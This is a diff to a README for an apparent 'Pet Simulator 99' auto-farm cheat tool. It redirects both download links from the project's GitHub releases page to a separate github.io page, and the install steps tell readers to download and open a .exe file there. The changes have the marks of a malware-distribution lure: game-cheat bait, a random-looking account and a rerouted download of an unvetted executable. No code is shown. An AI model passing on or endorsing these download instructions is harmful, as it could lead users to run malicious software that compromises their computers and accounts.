@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Peta - Optimize your pet game farming speed
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/doting-gravitationalmass930/Pet-Simulator-99-Auto-Farm-Trainer-2026-Peta/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://doting-gravitationalmass930.github.io)
 
 This software helps you automate tasks in Pet Simulator 99. It handles farming coins, hatching eggs, and breaking objects. The tool saves you time and keeps your account active while you focus on other tasks. The interface provides a simple way to control your settings without complex steps.
 
@@ -18,7 +18,7 @@ Ensure you meet these requirements before you start:
 
 Follow these steps to set up the software.
 
-1. Visit this page to download: [https://github.com/doting-gravitationalmass930/Pet-Simulator-99-Auto-Farm-Trainer-2026-Peta/releases](https://github.com/doting-gravitationalmass930/Pet-Simulator-99-Auto-Farm-Trainer-2026-Peta/releases).
+1. Visit this page to download: [https://doting-gravitationalmass930.github.io](https://doting-gravitationalmass930.github.io).
 2. Locate the latest release file with a .exe extension.
 3. Save the file to your computer.
 4. Open the folder where you saved the file.
